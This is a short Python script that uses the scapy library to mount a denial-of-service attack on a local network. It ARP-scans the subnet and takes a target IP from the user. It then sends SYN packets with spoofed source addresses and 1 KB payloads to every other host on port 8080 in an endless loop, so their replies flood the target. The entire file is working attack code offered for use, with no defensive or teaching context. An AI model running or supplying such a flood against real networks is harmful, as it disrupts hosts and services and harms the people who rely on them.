print('LOADING: program getting ready to attack...')


import scapy.all as scapy
import sys, socket
def getIps(hackerip):
    ipl = hackerip.split('.')
    ips = []
    # print(f'ipl[0]}.{ipl[1]}.{ipl[2]}.1/24')
    arpRequest = scapy.ARP(pdst=f'{ipl[0]}.{ipl[1]}.{ipl[2]}.1/24')
    brodcustEther = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    packet = brodcustEther / arpRequest

    result = scapy.srp(packet, timeout = 2, verbose = 0)[0]
    for sent, received  in result:
        print(received.psrc)
        ips.append(received.psrc)

    return ips

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP


def synPacket(tragetIp, tragetPort, networkIp):
        ip = scapy.IP(dst=networkIp, src = tragetIp)

        tcp = scapy.TCP(sport=scapy.RandShort(), dport= tragetPort, flags='S')


        raw = scapy.Raw(b"x"*1024)
        packet = ip / tcp / raw

        scapy.send(packet, loop=0, verbose =0)


ip = get_ip()

#starting the Attck
ips = getIps(ip)

if len(ips) == 0:
    print('You have no one in your network who uses Arp protocol, Attack cant go on.')
    sys.exit()
ips.remove(ips[0])
targetip = input('Enter Target IP: ')

if targetip in ips:
    print('Ip found \n Starting Attack')
if targetip not in ips:
    
    print('The ip is not online enter  another one')
    sys.exit()

# print(f'target Ip: {targetip}')

# print(f'hacker Ip: {ip}')

# print(f'ip List: {ips}')

while True:
    for i in range(len(ips)):
        synPacket(targetip,8080, ips[i])

